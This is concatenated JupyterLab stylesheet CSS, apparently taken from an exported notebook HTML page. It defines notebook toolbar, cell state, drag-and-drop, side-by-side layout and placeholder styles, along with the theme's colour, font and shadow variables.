/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Variables
|----------------------------------------------------------------------------*/

:root {
  --jp-notebook-toolbar-padding: 2px 5px 2px 2px;
}

/*-----------------------------------------------------------------------------

/*-----------------------------------------------------------------------------
| Styles
|----------------------------------------------------------------------------*/

.jp-NotebookPanel-toolbar {
  padding: var(--jp-notebook-toolbar-padding);

  /* disable paint containment from lumino 2.0 default strict CSS containment */
  contain: style size !important;
}

.jp-Toolbar-item.jp-Notebook-toolbarCellType .jp-select-wrapper.jp-mod-focused {
  border: none;
  box-shadow: none;
}

.jp-Notebook-toolbarCellTypeDropdown select {
  height: 24px;
  font-size: var(--jp-ui-font-size1);
  line-height: 14px;
  border-radius: 0;
  display: block;
}

.jp-Notebook-toolbarCellTypeDropdown span {
  top: 5px !important;
}

.jp-Toolbar-responsive-popup {
  position: absolute;
  height: fit-content;
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  justify-content: flex-end;
  border-bottom: var(--jp-border-width) solid var(--jp-toolbar-border-color);
  box-shadow: var(--jp-toolbar-box-shadow);
  background: var(--jp-toolbar-background);
  min-height: var(--jp-toolbar-micro-height);
  padding: var(--jp-notebook-toolbar-padding);
  z-index: 1;
  right: 0;
  top: 0;
}

.jp-Toolbar > .jp-Toolbar-responsive-opener {
  margin-left: auto;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Variables
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------

/*-----------------------------------------------------------------------------
| Styles
|----------------------------------------------------------------------------*/

.jp-Notebook-ExecutionIndicator {
  position: relative;
  display: inline-block;
  height: 100%;
  z-index: 9997;
}

.jp-Notebook-ExecutionIndicator-tooltip {
  visibility: hidden;
  height: auto;
  width: max-content;
  width: -moz-max-content;
  background-color: var(--jp-layout-color2);
  color: var(--jp-ui-font-color1);
  text-align: justify;
  border-radius: 6px;
  padding: 0 5px;
  position: fixed;
  display: table;
}

.jp-Notebook-ExecutionIndicator-tooltip.up {
  transform: translateX(-50%) translateY(-100%) translateY(-32px);
}

.jp-Notebook-ExecutionIndicator-tooltip.down {
  transform: translateX(calc(-100% + 16px)) translateY(5px);
}

.jp-Notebook-ExecutionIndicator-tooltip.hidden {
  display: none;
}

.jp-Notebook-ExecutionIndicator:hover .jp-Notebook-ExecutionIndicator-tooltip {
  visibility: visible;
}

.jp-Notebook-ExecutionIndicator span {
  font-size: var(--jp-ui-font-size1);
  font-family: var(--jp-ui-font-family);
  color: var(--jp-ui-font-color1);
  line-height: 24px;
  display: block;
}

.jp-Notebook-ExecutionIndicator-progress-bar {
  display: flex;
  justify-content: center;
  height: 100%;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*
 * Execution indicator
 */
.jp-tocItem-content::after {
  content: '';

  /* Must be identical to form a circle */
  width: 12px;
  height: 12px;
  background: none;
  border: none;
  position: absolute;
  right: 0;
}

.jp-tocItem-content[data-running='0']::after {
  border-radius: 50%;
  border: var(--jp-border-width) solid var(--jp-inverse-layout-color3);
  background: none;
}

.jp-tocItem-content[data-running='1']::after {
  border-radius: 50%;
  border: var(--jp-border-width) solid var(--jp-inverse-layout-color3);
  background-color: var(--jp-inverse-layout-color3);
}

.jp-tocItem-content[data-running='0'],
.jp-tocItem-content[data-running='1'] {
  margin-right: 12px;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

.jp-Notebook-footer {
  height: 27px;
  margin-left: calc(
    var(--jp-cell-prompt-width) + var(--jp-cell-collapser-width) +
      var(--jp-cell-padding)
  );
  width: calc(
    100% -
      (
        var(--jp-cell-prompt-width) + var(--jp-cell-collapser-width) +
          var(--jp-cell-padding) + var(--jp-cell-padding)
      )
  );
  border: var(--jp-border-width) solid var(--jp-cell-editor-border-color);
  color: var(--jp-ui-font-color3);
  margin-top: 6px;
  background: none;
  cursor: pointer;
}

.jp-Notebook-footer:focus {
  border-color: var(--jp-cell-editor-active-border-color);
}

/* For devices that support hovering, hide footer until hover */
@media (hover: hover) {
  .jp-Notebook-footer {
    opacity: 0;
  }

  .jp-Notebook-footer:focus,
  .jp-Notebook-footer:hover {
    opacity: 1;
  }
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Imports
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| CSS variables
|----------------------------------------------------------------------------*/

:root {
  --jp-side-by-side-output-size: 1fr;
  --jp-side-by-side-resized-cell: var(--jp-side-by-side-output-size);
  --jp-private-notebook-dragImage-width: 304px;
  --jp-private-notebook-dragImage-height: 36px;
  --jp-private-notebook-selected-color: var(--md-blue-400);
  --jp-private-notebook-active-color: var(--md-green-400);
}

/*-----------------------------------------------------------------------------
| Notebook
|----------------------------------------------------------------------------*/

/* stylelint-disable selector-max-class */

.jp-NotebookPanel {
  display: block;
  height: 100%;
}

.jp-NotebookPanel.jp-Document {
  min-width: 240px;
  min-height: 120px;
}

.jp-Notebook {
  padding: var(--jp-notebook-padding);
  outline: none;
  overflow: auto;
  background: var(--jp-layout-color0);
}

.jp-Notebook.jp-mod-scrollPastEnd::after {
  display: block;
  content: '';
  min-height: var(--jp-notebook-scroll-padding);
}

.jp-MainAreaWidget-ContainStrict .jp-Notebook * {
  contain: strict;
}

.jp-Notebook .jp-Cell {
  overflow: visible;
}

.jp-Notebook .jp-Cell .jp-InputPrompt {
  cursor: move;
}

/*-----------------------------------------------------------------------------
| Notebook state related styling
|
| The notebook and cells each have states, here are the possibilities:
|
| - Notebook
|   - Command
|   - Edit
| - Cell
|   - None
|   - Active (only one can be active)
|   - Selected (the cells actions are applied to)
|   - Multiselected (when multiple selected, the cursor)
|   - No outputs
|----------------------------------------------------------------------------*/

/* Command or edit modes */

.jp-Notebook .jp-Cell:not(.jp-mod-active) .jp-InputPrompt {
  opacity: var(--jp-cell-prompt-not-active-opacity);
  color: var(--jp-cell-prompt-not-active-font-color);
}

.jp-Notebook .jp-Cell:not(.jp-mod-active) .jp-OutputPrompt {
  opacity: var(--jp-cell-prompt-not-active-opacity);
  color: var(--jp-cell-prompt-not-active-font-color);
}

/* cell is active */
.jp-Notebook .jp-Cell.jp-mod-active .jp-Collapser {
  background: var(--jp-brand-color1);
}

/* cell is dirty */
.jp-Notebook .jp-Cell.jp-mod-dirty .jp-InputPrompt {
  color: var(--jp-warn-color1);
}

.jp-Notebook .jp-Cell.jp-mod-dirty .jp-InputPrompt::before {
  color: var(--jp-warn-color1);
  content: '';
}

.jp-Notebook .jp-Cell.jp-mod-active.jp-mod-dirty .jp-Collapser {
  background: var(--jp-warn-color1);
}

/* collapser is hovered */
.jp-Notebook .jp-Cell .jp-Collapser:hover {
  box-shadow: var(--jp-elevation-z2);
  background: var(--jp-brand-color1);
  opacity: var(--jp-cell-collapser-not-active-hover-opacity);
}

/* cell is active and collapser is hovered */
.jp-Notebook .jp-Cell.jp-mod-active .jp-Collapser:hover {
  background: var(--jp-brand-color0);
  opacity: 1;
}

/* Command mode */

.jp-Notebook.jp-mod-commandMode .jp-Cell.jp-mod-selected {
  background: var(--jp-notebook-multiselected-color);
}

.jp-Notebook.jp-mod-commandMode
  .jp-Cell.jp-mod-active.jp-mod-selected:not(.jp-mod-multiSelected) {
  background: transparent;
}

/* Edit mode */

.jp-Notebook.jp-mod-editMode .jp-Cell.jp-mod-active .jp-InputArea-editor {
  border: var(--jp-border-width) solid var(--jp-cell-editor-active-border-color);
  box-shadow: var(--jp-input-box-shadow);
  background-color: var(--jp-cell-editor-active-background);
}

/*-----------------------------------------------------------------------------
| Notebook drag and drop
|----------------------------------------------------------------------------*/

.jp-Notebook-cell.jp-mod-dropSource {
  opacity: 0.5;
}

.jp-Notebook-cell.jp-mod-dropTarget,
.jp-Notebook.jp-mod-commandMode
  .jp-Notebook-cell.jp-mod-active.jp-mod-selected.jp-mod-dropTarget {
  border-top-color: var(--jp-private-notebook-selected-color);
  border-top-style: solid;
  border-top-width: 2px;
}

.jp-dragImage {
  display: block;
  flex-direction: row;
  width: var(--jp-private-notebook-dragImage-width);
  height: var(--jp-private-notebook-dragImage-height);
  border: var(--jp-border-width) solid var(--jp-cell-editor-border-color);
  background: var(--jp-cell-editor-background);
  overflow: visible;
}

.jp-dragImage-singlePrompt {
  box-shadow: 2px 2px 4px 0 rgba(0, 0, 0, 0.12);
}

.jp-dragImage .jp-dragImage-content {
  flex: 1 1 auto;
  z-index: 2;
  font-size: var(--jp-code-font-size);
  font-family: var(--jp-code-font-family);
  line-height: var(--jp-code-line-height);
  padding: var(--jp-code-padding);
  border: var(--jp-border-width) solid var(--jp-cell-editor-border-color);
  background: var(--jp-cell-editor-background-color);
  color: var(--jp-content-font-color3);
  text-align: left;
  margin: 4px 4px 4px 0;
}

.jp-dragImage .jp-dragImage-prompt {
  flex: 0 0 auto;
  min-width: 36px;
  color: var(--jp-cell-inprompt-font-color);
  padding: var(--jp-code-padding);
  padding-left: 12px;
  font-family: var(--jp-cell-prompt-font-family);
  letter-spacing: var(--jp-cell-prompt-letter-spacing);
  line-height: 1.9;
  font-size: var(--jp-code-font-size);
  border: var(--jp-border-width) solid transparent;
}

.jp-dragImage-multipleBack {
  z-index: -1;
  position: absolute;
  height: 32px;
  width: 300px;
  top: 8px;
  left: 8px;
  background: var(--jp-layout-color2);
  border: var(--jp-border-width) solid var(--jp-input-border-color);
  box-shadow: 2px 2px 4px 0 rgba(0, 0, 0, 0.12);
}

/*-----------------------------------------------------------------------------
| Cell toolbar
|----------------------------------------------------------------------------*/

.jp-NotebookTools {
  display: block;
  min-width: var(--jp-sidebar-min-width);
  color: var(--jp-ui-font-color1);
  background: var(--jp-layout-color1);

  /* This is needed so that all font sizing of children done in ems is
    * relative to this base size */
  font-size: var(--jp-ui-font-size1);
  overflow: auto;
}

.jp-ActiveCellTool {
  padding: 12px 0;
  display: flex;
}

.jp-ActiveCellTool-Content {
  flex: 1 1 auto;
}

.jp-ActiveCellTool .jp-ActiveCellTool-CellContent {
  background: var(--jp-cell-editor-background);
  border: var(--jp-border-width) solid var(--jp-cell-editor-border-color);
  border-radius: 0;
  min-height: 29px;
}

.jp-ActiveCellTool .jp-InputPrompt {
  min-width: calc(var(--jp-cell-prompt-width) * 0.75);
}

.jp-ActiveCellTool-CellContent > pre {
  padding: 5px 4px;
  margin: 0;
  white-space: normal;
}

.jp-MetadataEditorTool {
  flex-direction: column;
  padding: 12px 0;
}

.jp-RankedPanel > :not(:first-child) {
  margin-top: 12px;
}

.jp-KeySelector select.jp-mod-styled {
  font-size: var(--jp-ui-font-size1);
  color: var(--jp-ui-font-color0);
  border: var(--jp-border-width) solid var(--jp-border-color1);
}

.jp-KeySelector label,
.jp-MetadataEditorTool label,
.jp-NumberSetter label {
  line-height: 1.4;
}

.jp-NotebookTools .jp-select-wrapper {
  margin-top: 4px;
  margin-bottom: 0;
}

.jp-NumberSetter input {
  width: 100%;
  margin-top: 4px;
}

.jp-NotebookTools .jp-Collapse {
  margin-top: 16px;
}

/*-----------------------------------------------------------------------------
| Presentation Mode (.jp-mod-presentationMode)
|----------------------------------------------------------------------------*/

.jp-mod-presentationMode .jp-Notebook {
  --jp-content-font-size1: var(--jp-content-presentation-font-size1);
  --jp-code-font-size: var(--jp-code-presentation-font-size);
}

.jp-mod-presentationMode .jp-Notebook .jp-Cell .jp-InputPrompt,
.jp-mod-presentationMode .jp-Notebook .jp-Cell .jp-OutputPrompt {
  flex: 0 0 110px;
}

/*-----------------------------------------------------------------------------
| Side-by-side Mode (.jp-mod-sideBySide)
|----------------------------------------------------------------------------*/
.jp-mod-sideBySide.jp-Notebook .jp-Notebook-cell {
  margin-top: 3em;
  margin-bottom: 3em;
  margin-left: 5%;
  margin-right: 5%;
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell {
  display: grid;
  grid-template-columns: minmax(0, 1fr) min-content minmax(
      0,
      var(--jp-side-by-side-output-size)
    );
  grid-template-rows: auto minmax(0, 1fr) auto;
  grid-template-areas:
    'header header header'
    'input handle output'
    'footer footer footer';
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell.jp-mod-resizedCell {
  grid-template-columns: minmax(0, 1fr) min-content minmax(
      0,
      var(--jp-side-by-side-resized-cell)
    );
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell .jp-CellHeader {
  grid-area: header;
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell .jp-Cell-inputWrapper {
  grid-area: input;
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell .jp-Cell-outputWrapper {
  /* overwrite the default margin (no vertical separation needed in side by side move */
  margin-top: 0;
  grid-area: output;
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell .jp-CellFooter {
  grid-area: footer;
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell .jp-CellResizeHandle {
  grid-area: handle;
  user-select: none;
  display: block;
  height: 100%;
  cursor: ew-resize;
  padding: 0 var(--jp-cell-padding);
}

.jp-mod-sideBySide.jp-Notebook .jp-CodeCell .jp-CellResizeHandle::after {
  content: '';
  display: block;
  background: var(--jp-border-color2);
  height: 100%;
  width: 5px;
}

.jp-mod-sideBySide.jp-Notebook
  .jp-CodeCell.jp-mod-resizedCell
  .jp-CellResizeHandle::after {
  background: var(--jp-border-color0);
}

.jp-CellResizeHandle {
  display: none;
}

/*-----------------------------------------------------------------------------
| Placeholder
|----------------------------------------------------------------------------*/

.jp-Cell-Placeholder {
  padding-left: 55px;
}

.jp-Cell-Placeholder-wrapper {
  background: #fff;
  border: 1px solid;
  border-color: #e5e6e9 #dfe0e4 #d0d1d5;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  margin: 10px 15px;
}

.jp-Cell-Placeholder-wrapper-inner {
  padding: 15px;
  position: relative;
}

.jp-Cell-Placeholder-wrapper-body {
  background-repeat: repeat;
  background-size: 50% auto;
}

.jp-Cell-Placeholder-wrapper-body div {
  background: #f6f7f8;
  background-image: -webkit-linear-gradient(
    left,
    #f6f7f8 0%,
    #edeef1 20%,
    #f6f7f8 40%,
    #f6f7f8 100%
  );
  background-repeat: no-repeat;
  background-size: 800px 104px;
  height: 104px;
  position: absolute;
  right: 15px;
  left: 15px;
  top: 15px;
}

div.jp-Cell-Placeholder-h1 {
  top: 20px;
  height: 20px;
  left: 15px;
  width: 150px;
}

div.jp-Cell-Placeholder-h2 {
  left: 15px;
  top: 50px;
  height: 10px;
  width: 100px;
}

div.jp-Cell-Placeholder-content-1,
div.jp-Cell-Placeholder-content-2,
div.jp-Cell-Placeholder-content-3 {
  left: 15px;
  right: 15px;
  height: 10px;
}

div.jp-Cell-Placeholder-content-1 {
  top: 100px;
}

div.jp-Cell-Placeholder-content-2 {
  top: 120px;
}

div.jp-Cell-Placeholder-content-3 {
  top: 140px;
}

</style>
<style type="text/css">
/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*
The following CSS variables define the main, public API for styling JupyterLab.
These variables should be used by all plugins wherever possible. In other
words, plugins should not define custom colors, sizes, etc unless absolutely
necessary. This enables users to change the visual theme of JupyterLab
by changing these variables.

Many variables appear in an ordered sequence (0,1,2,3). These sequences
are designed to work well together, so for example, `--jp-border-color1` should
be used with `--jp-layout-color1`. The numbers have the following meanings:

* 0: super-primary, reserved for special emphasis
* 1: primary, most important under normal situations
* 2: secondary, next most important under normal situations
* 3: tertiary, next most important under normal situations

Throughout JupyterLab, we are mostly following principles from Google's
Material Design when selecting colors. We are not, however, following
all of MD as it is not optimized for dense, information rich UIs.
*/

:root {
  /* Elevation
   *
   * We style box-shadows using Material Design's idea of elevation. These particular numbers are taken from here:
   *
   * https://github.com/material-components/material-components-web
   * https://material-components-web.appspot.com/elevation.html
   */

  --jp-shadow-base-lightness: 0;
  --jp-shadow-umbra-color: rgba(
    var(--jp-shadow-base-lightness),
    var(--jp-shadow-base-lightness),
    var(--jp-shadow-base-lightness),
    0.2
  );
  --jp-shadow-penumbra-color: rgba(
    var(--jp-shadow-base-lightness),
    var(--jp-shadow-base-lightness),
    var(--jp-shadow-base-lightness),
    0.14
  );
  --jp-shadow-ambient-color: rgba(
    var(--jp-shadow-base-lightness),
    var(--jp-shadow-base-lightness),
    var(--jp-shadow-base-lightness),
    0.12
  );
  --jp-elevation-z0: none;
  --jp-elevation-z1: 0 2px 1px -1px var(--jp-shadow-umbra-color),
    0 1px 1px 0 var(--jp-shadow-penumbra-color),
    0 1px 3px 0 var(--jp-shadow-ambient-color);
  --jp-elevation-z2: 0 3px 1px -2px var(--jp-shadow-umbra-color),
    0 2px 2px 0 var(--jp-shadow-penumbra-color),
    0 1px 5px 0 var(--jp-shadow-ambient-color);
  --jp-elevation-z4: 0 2px 4px -1px var(--jp-shadow-umbra-color),
    0 4px 5px 0 var(--jp-shadow-penumbra-color),
    0 1px 10px 0 var(--jp-shadow-ambient-color);
  --jp-elevation-z6: 0 3px 5px -1px var(--jp-shadow-umbra-color),
    0 6px 10px 0 var(--jp-shadow-penumbra-color),
    0 1px 18px 0 var(--jp-shadow-ambient-color);
  --jp-elevation-z8: 0 5px 5px -3px var(--jp-shadow-umbra-color),
    0 8px 10px 1px var(--jp-shadow-penumbra-color),
    0 3px 14px 2px var(--jp-shadow-ambient-color);
  --jp-elevation-z12: 0 7px 8px -4px var(--jp-shadow-umbra-color),
    0 12px 17px 2px var(--jp-shadow-penumbra-color),
    0 5px 22px 4px var(--jp-shadow-ambient-color);
  --jp-elevation-z16: 0 8px 10px -5px var(--jp-shadow-umbra-color),
    0 16px 24px 2px var(--jp-shadow-penumbra-color),
    0 6px 30px 5px var(--jp-shadow-ambient-color);
  --jp-elevation-z20: 0 10px 13px -6px var(--jp-shadow-umbra-color),
    0 20px 31px 3px var(--jp-shadow-penumbra-color),
    0 8px 38px 7px var(--jp-shadow-ambient-color);
  --jp-elevation-z24: 0 11px 15px -7px var(--jp-shadow-umbra-color),
    0 24px 38px 3px var(--jp-shadow-penumbra-color),
    0 9px 46px 8px var(--jp-shadow-ambient-color);

  /* Borders
   *
   * The following variables, specify the visual styling of borders in JupyterLab.
   */

  --jp-border-width: 1px;
  --jp-border-color0: var(--md-grey-400);
  --jp-border-color1: var(--md-grey-400);
  --jp-border-color2: var(--md-grey-300);
  --jp-border-color3: var(--md-grey-200);
  --jp-inverse-border-color: var(--md-grey-600);
  --jp-border-radius: 2px;

  /* UI Fonts
   *
   * The UI font CSS variables are used for the typography all of the JupyterLab
   * user interface elements that are not directly user generated content.
   *
   * The font sizing here is done assuming that the body font size of --jp-ui-font-size1
   * is applied to a parent element. When children elements, such as headings, are sized
   * in em all things will be computed relative to that body size.
   */

  --jp-ui-font-scale-factor: 1.2;
  --jp-ui-font-size0: 0.83333em;
  --jp-ui-font-size1: 13px; /* Base font size */
  --jp-ui-font-size2: 1.2em;
  --jp-ui-font-size3: 1.44em;
  --jp-ui-font-family: system-ui, -apple-system, blinkmacsystemfont, 'Segoe UI',
    helvetica, arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji',
    'Segoe UI Symbol';

  /*
   * Use these font colors against the corresponding main layout colors.
   * In a light theme, these go from dark to light.
   */

  /* Defaults use Material Design specification */
  --jp-ui-font-color0: rgba(0, 0, 0, 1);
  --jp-ui-font-color1: rgba(0, 0, 0, 0.87);
  --jp-ui-font-color2: rgba(0, 0, 0, 0.54);
  --jp-ui-font-color3: rgba(0, 0, 0, 0.38);

  /*
   * Use these against the brand/accent/warn/error colors.
   * These will typically go from light to darker, in both a dark and light theme.
   */

  --jp-ui-inverse-font-color0: rgba(255, 255, 255, 1);
  --jp-ui-inverse-font-color1: rgba(255, 255, 255, 1);
  --jp-ui-inverse-font-color2: rgba(255, 255, 255, 0.7);
  --jp-ui-inverse-font-color3: rgba(255, 255, 255, 0.5);

  /* Content Fonts
   *
   * Content font variables are used for typography of user generated content.
   *
   * The font sizing here is done assuming that the body font size of --jp-content-font-size1
   * is applied to a parent element. When children elements, such as headings, are sized
   * in em all things will be computed relative to that body size.
   */

  --jp-content-line-height: 1.6;
  --jp-content-font-scale-factor: 1.2;
  --jp-content-font-size0: 0.83333em;
  --jp-content-font-size1: 14px; /* Base font size */
  --jp-content-font-size2: 1.2em;
  --jp-content-font-size3: 1.44em;
  --jp-content-font-size4: 1.728em;
  --jp-content-font-size5: 2.0736em;

  /* This gives a magnification of about 125% in presentation mode over normal. */
  --jp-content-presentation-font-size1: 17px;
  --jp-content-heading-line-height: 1;
  --jp-content-heading-margin-top: 1.2em;
  --jp-content-heading-margin-bottom: 0.8em;
  --jp-content-heading-font-weight: 500;

  /* Defaults use Material Design specification */
  --jp-content-font-color0: rgba(0, 0, 0, 1);
  --jp-content-font-color1: rgba(0, 0, 0, 0.87);
  --jp-content-font-color2: rgba(0, 0, 0, 0.54);
  --jp-content-font-color3: rgba(0, 0, 0, 0.38);
  --jp-content-link-color: var(--md-blue-900);
  --jp-content-font-family: system-ui, -apple-system, blinkmacsystemfont,
    'Segoe UI', helvetica, arial, sans-serif, 'Apple Color Emoji',
    'Segoe UI Emoji', 'Segoe UI Symbol';

  /*
   * Code Fonts
   *
   * Code font variables are used for typography of code and other monospaces content.
   */

  --jp-code-font-size: 13px;
  --jp-code-line-height: 1.3077; /* 17px for 13px base */
  --jp-code-padding: 5px; /* 5px for 13px base, codemirror highlighting needs integer px value */
  --jp-code-font-family-default: menlo, consolas, 'DejaVu Sans Mono', monospace;
  --jp-code-font-family: var(--jp-code-font-family-default);

  /* This gives a magnification of about 125% in presentation mode over normal. */
  --jp-code-presentation-font-size: 16px;

  /* may need to tweak cursor width if you change font size */
  --jp-code-cursor-width0: 1.4px;
  --jp-code-cursor-width1: 2px;
  --jp-code-cursor-width2: 4px;

  /* Layout
   *
   * The following are the main layout colors use in JupyterLab. In a light
   * theme these would go from light to dark.
   */

  --jp-layout-color0: white;
  --jp-layout-color1: white;
  --jp-layout-color2: var(--md-grey-200);
  --jp-layout-color3: var(--md-grey-400);
  --jp-layout-color4: var(--md-grey-600);

  /* Inverse Layout
   *
   * The following are the inverse layout colors use in JupyterLab. In a light
   * theme these would go from dark to light.
   */

  --jp-inverse-layout-color0: #111;
  --jp-inverse-layout-color1: var(--md-grey-900);
  --jp-inverse-layout-color2: var(--md-grey-800);
  --jp-inverse-layout-color3: var(--md-grey-700);
  --jp-inverse-layout-color4: var(--md-grey-600);

  /* Brand/accent */

  --jp-brand-color0: var(--md-blue-900);
  --jp-brand-color1: var(--md-blue-700);
  --jp-brand-color2: var(--md-blue-300);
  --jp-brand-color3: var(--md-blue-100);
  --jp-brand-color4: var(--md-blue-50);
  --jp-accent-color0: var(--md-green-900);
  --jp-accent-color1: var(--md-green-700);
  --jp-accent-color2: var(--md-green-300);
  --jp-accent-color3: var(--md-green-100);

  /* State colors (warn, error, success, info) */

  --jp-warn-color0: var(--md-orange-900);
  --jp-warn-color1: var(--md-orange-700);
  --jp-warn-color2: var(--md-orange-300);
  --jp-warn-color3: var(--md-orange-100);
  --jp-error-color0: var(--md-red-900);
  --jp-error-color1: var(--md-red-700);
  --jp-error-color2: var(--md-red-300);
  --jp-error-color3: var(--md-red-100);
  --jp-success-color0: var(--md-green-900);
  --jp-success-color1: var(--md-green-700);
  --jp-success-color2: var(--md-green-300);
  --jp-success-color3: var(--md-green-100);
  --jp-info-color0: var(--md-cyan-900);
  --jp-info-color1: var(--md-cyan-700);
  --jp-info-color2: var(--md-cyan-300);
  --jp-info-color3: var(--md-cyan-100);

  /* Cell specific styles */

  --jp-cell-padding: 5px;
  --jp-cell-collapser-width: 8px;
  --jp-cell-collapser-min-height: 20px;
  --jp-cell-collapser-not-active-hover-opacity: 0.6;
  --jp-cell-editor-background: var(--md-grey-100);
  --jp-cell-editor-border-color: var(--md-grey-300);
  --jp-cell-editor-box-shadow: inset 0 0 2px var(--md-blue-300);
  --jp-cell-editor-active-background: var(--jp-layout-color0);
  --jp-cell-editor-active-border-color: var(--jp-brand-color1);
  --jp-cell-prompt-width: 64px;
  --jp-cell-prompt-font-family: var(--jp-code-font-family-default);
  --jp-cell-prompt-letter-spacing: 0;
  --jp-cell-prompt-opacity: 1;
  --jp-cell-prompt-not-active-opacity: 0.5;
  --jp-cell-prompt-not-active-font-color: var(--md-grey-700);

  /* A custom blend of MD grey and blue 600
   * See https://meyerweb.com/eric/tools/color-blend/#546E7A:1E88E5:5:hex */
  --jp-cell-inprompt-font-color: #307fc1;

  /* A custom blend of MD grey and orange 600
   * https://meyerweb.com/eric/tools/color-blend/#546E7A:F4511E:5:hex */
  --jp-cell-outprompt-font-color: #bf5b3d;

  /* Notebook specific styles */

  --jp-notebook-padding: 10px;
  --jp-notebook-select-background: var(--jp-layout-color1);
  --jp-notebook-multiselected-color: var(--md-blue-50);

  /* The scroll padding is calculated to fill enough space at the bottom of the
  notebook to show one single-line cell (with appropriate padding) at the top
  when the notebook is scrolled all the way to the bottom. We also subtract one
  pixel so that no scrollbar appears if we have just one single-line cell in the
  notebook. This padding is to enable a 'scroll past end' feature in a notebook.
  */
  --jp-notebook-scroll-padding: calc(
    100% - var(--jp-code-font-size) * var(--jp-code-line-height) -
      var(--jp-code-padding) - var(--jp-cell-padding) - 1px
  );

  /* Rendermime styles */

  --jp-rendermime-error-background: #fdd;
  --jp-rendermime-table-row-background: var(--md-grey-100);
  --jp-rendermime-table-row-hover-background: var(--md-light-blue-50);

  /* Dialog specific styles */

  --jp-dialog-background: rgba(0, 0, 0, 0.25);

  /* Console specific styles */

  --jp-console-padding: 10px;

  /* Toolbar specific styles */

  --jp-toolbar-border-color: var(--jp-border-color1);
  --jp-toolbar-micro-height: 8px;
  --jp-toolbar-background: var(--jp-layout-color1);
  --jp-toolbar-box-shadow: 0 0 2px 0 rgba(0, 0, 0, 0.24);
  --jp-toolbar-header-margin: 4px 4px 0 4px;
  --jp-toolbar-active-background: var(--md-grey-300);

  /* Statusbar specific styles */

  --jp-statusbar-height: 24px;

  /* Input field styles */

  --jp-input-box-shadow: inset 0 0 2px var(--md-blue-300);
  --jp-input-active-background: var(--jp-layout-color1);
  --jp-input-hover-background: var(--jp-layout-color1);
  --jp-input-background: var(--md-grey-100);
  --jp-input-border-color: var(--jp-inverse-border-color);
  --jp-input-active-border-color: var(--jp-brand-color1);
  --jp-input-active-box-shadow-color: rgba(19, 124, 189, 0.3);

  /* General editor styles */

  --jp-editor-selected-background: #d9d9d9;
  --jp-editor-selected-focused-background: #d7d4f0;
  --jp-editor-cursor-color: var(--jp-ui-font-color0);

  /* Code mirror specific styles */

  --jp-mirror-editor-keyword-color: #008000;
  --jp-mirror-editor-atom-color: #88f;
  --jp-mirror-editor-number-color: #080;
  --jp-mirror-editor-def-color: #00f;
  --jp-mirror-editor-variable-color: var(--md-grey-900);
  --jp-mirror-editor-variable-2-color: rgb(0, 54, 109);
  --jp-mirror-editor-variable-3-color: #085;
  --jp-mirror-editor-punctuation-color: #05a;
  --jp-mirror-editor-property-color: #05a;
  --jp-mirror-editor-operator-color: #a2f;
  --jp-mirror-editor-comment-color: #408080;
  --jp-mirror-editor-string-color: #ba2121;
  --jp-mirror-editor-string-2-color: #708;
  --jp-mirror-editor-meta-color: #a2f;
  --jp-mirror-editor-qualifier-color: #555;
  --jp-mirror-editor-builtin-color: #008000;
  --jp-mirror-editor-bracket-color: #997;
  --jp-mirror-editor-tag-color: #170;
  --jp-mirror-editor-attribute-color: #00c;
  --jp-mirror-editor-header-color: blue;
  --jp-mirror-editor-quote-color: #090;
  --jp-mirror-editor-link-color: #00c;
  --jp-mirror-editor-error-color: #f00;
  --jp-mirror-editor-hr-color: #999;

  /*
    RTC user specific colors.
    These colors are used for the cursor, username in the editor,
    and the icon of the user.
  */

  --jp-collaborator-color1: #ffad8e;
  --jp-collaborator-color2: #dac83d;
  --jp-collaborator-color3: #72dd76;
  --jp-collaborator-color4: #00e4d0;
  --jp-collaborator-color5: #45d4ff;
  --jp-collaborator-color6: #e2b1ff;
  --jp-collaborator-color7: #ff9de6;

  /* Vega extension styles */

  --jp-vega-background: white;

  /* Sidebar-related styles */

  --jp-sidebar-min-width: 250px;

  /* Search-related styles */

  --jp-search-toggle-off-opacity: 0.5;
  --jp-search-toggle-hover-opacity: 0.8;
  --jp-search-toggle-on-opacity: 1;
  --jp-search-selected-match-background-color: rgb(245, 200, 0);
  --jp-search-selected-match-color: black;
  --jp-search-unselected-match-background-color: var(
    --jp-inverse-layout-color0
  );
  --jp-search-unselected-match-color: var(--jp-ui-inverse-font-color0);

  /* Icon colors that work well with light or dark backgrounds */
  --jp-icon-contrast-color0: var(--md-purple-600);
  --jp-icon-contrast-color1: var(--md-green-600);
  --jp-icon-contrast-color2: var(--md-pink-600);
  --jp-icon-contrast-color3: var(--md-blue-600);

  /* Button colors */
  --jp-accept-color-normal: var(--md-blue-700);
  --jp-accept-color-hover: var(--md-blue-800);
  --jp-accept-color-active: var(--md-blue-900);
  --jp-warn-color-normal: var(--md-red-700);
  --jp-warn-color-hover: var(--md-red-800);
  --jp-warn-color-active: var(--md-red-900);
  --jp-reject-color-normal: var(--md-grey-600);
  --jp-reject-color-hover: var(--md-grey-700);
